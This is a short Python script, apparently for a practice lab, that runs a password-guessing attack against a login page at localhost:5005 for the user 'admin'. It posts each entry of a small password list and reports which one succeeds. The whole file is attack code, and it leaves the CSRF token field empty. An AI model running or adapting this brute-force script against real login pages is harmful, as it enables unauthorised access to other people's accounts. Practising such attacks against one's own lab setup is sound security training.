import requests

passwords = ['test', 'admin', 'password', 'lup.8', 'secret']
user_token = ""
for password in passwords:
    response = requests.post("http://localhost:5005/login.php", data={
        "username": "admin",
        "password": password,
        "Login": "Login",
        "user_token": user_token
    })
    text = response.text
    if 'incorrect' in text:
        print("Incorrect token")
    elif 'Login failed' in text:
        print("Incorrect password")
    else:
        print("Password " + password + " is correct !")
